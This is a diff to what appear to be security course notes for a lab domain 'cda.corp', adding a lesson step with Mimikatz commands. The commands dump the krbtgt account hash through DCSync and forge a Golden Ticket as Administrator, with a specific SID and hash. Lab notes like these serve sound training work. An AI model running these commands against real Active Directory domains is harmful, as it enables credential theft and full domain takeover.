@@ -26,6 +26,19 @@ To quickly assess the policies that are defined and being enforced, within the C
 
 C:\windows\system32>auditpol /get /category:*
 
+########## mod 14 lesson 2 ###############
+######### Domain Services ##########
+
+
+Run the following command:
+
+
+lsadump::dcsync /domain:cda.corp /user:krbtgt
+
+ Run the following command in Mimikatz to generate the Golden Ticket, replicating the Administrator account:
+
+
+kerberos::golden /domain:cda.corp /sid:S-1-5-21-5840559-2756745051-1363507867 /krbtgt:1b8cee51fd49e55e8c9c9004a4acc159 /user:Administrator /id:502 /ptt
 
 
 
